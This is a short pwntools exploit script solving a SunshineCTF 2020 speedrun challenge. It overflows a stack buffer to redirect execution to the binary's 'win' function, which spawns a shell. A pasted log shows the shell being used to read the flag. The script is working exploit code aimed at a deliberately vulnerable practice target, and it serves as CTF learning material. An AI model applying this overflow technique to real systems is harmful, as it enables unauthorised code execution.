from pwn import *

p = remote('chal.2020.sunshinectf.org', 30002)
#p = process('./chall_02')

e = ELF('./chall_02')

p.readline()
input('...')

p.send('a'*0x12)

print('[INFO] launch /bin/sh 0x%.8x' %(e.symbols['win']))

line = b'a'*0x3e
line += p64(e.symbols['win'])
line += b'\n'

p.send(line)

p.interactive()

'''
[+] Opening connection to chal.2020.sunshinectf.org on port 30002: Done
[*] '/vagrant/junkdrawer/sunshine/speedrun/chall_02'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
...
[INFO] launch /bin/sh 0x080484d6
[*] Switching to interactive mode
$ ls
chall_02
flag.txt
$ cat flag.txt
sun{warmness-on-the-soul-3b6aad1d8bb54732}
'''

